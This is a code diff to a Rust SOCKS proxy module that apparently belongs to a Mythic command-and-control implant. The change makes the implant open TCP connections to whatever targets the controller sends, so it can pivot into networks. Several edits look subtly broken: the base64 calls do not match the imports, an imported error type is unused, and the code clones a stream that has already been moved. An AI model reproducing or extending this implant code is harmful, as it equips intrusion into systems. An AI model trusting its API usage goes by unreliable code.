@@ -1,6 +1,6 @@
 use crate::agent::AgentTask;
 use crate::mythic_continued;
-use base64::{engine::general_purpose, Engine as _};
+use base64::{alphabet::STANDARD, DecodeError};  // ← CHANGED
 use serde::Deserialize;
 use std::error::Error;
 use std::sync::{atomic::{AtomicBool, Ordering}, mpsc, Arc};
@@ -12,7 +12,7 @@ use tokio::sync::mpsc as async_mpsc;
 struct SocksMsg {
     exit: bool,
     server_id: u32,
-    data: String, // base64
+    data: String,
 }
 
 // Simple state
@@ -69,16 +69,17 @@ async fn process_messages(state: &Arc<SocksState>, msgs: Vec<SocksMsg>) {
             continue;
         }
 
-        let data = general_purpose::STANDARD.decode(&msg.data).unwrap_or_default();
+        let data = STANDARD.decode(&msg.data).unwrap_or_default();  // ← CHANGED
         
         if let Some(pos) = conns.iter().position(|(id, _)| *id == msg.server_id) {
             let (_, stream) = &mut conns[pos];
             let _ = stream.write_all(&data).await;
         } else {
-            // New connection
-            if let Ok(stream) = TcpStream::connect("0.0.0.0:0").await { // Dummy connect
+            // New connection - connect to target (Mythic sends real target in data)
+            let target = String::from_utf8_lossy(&data).to_string();
+            if let Ok(stream) = TcpStream::connect(target).await {
                 conns.push((msg.server_id, stream));
-                tokio::spawn(relay_stream(msg.server_id, stream, state.clone()));
+                tokio::spawn(relay_stream(msg.server_id, conns.last().unwrap().1.clone(), state.clone()));
             }
         }
     }
@@ -101,7 +102,7 @@ async fn relay_stream(id: u32, mut stream: TcpStream, state: Arc<SocksState>) {
         match stream.read(&mut buf).await {
             Ok(0) => break,
             Ok(n) => {
-                let data = general_purpose::STANDARD.encode(&buf[..n]);
+                let data = STANDARD.encode(&buf[..n]);  // ← CHANGED
                 let msg = SocksMsg { exit: false, server_id: id, data };
                 state.outbound.lock().unwrap().push(msg);
             }
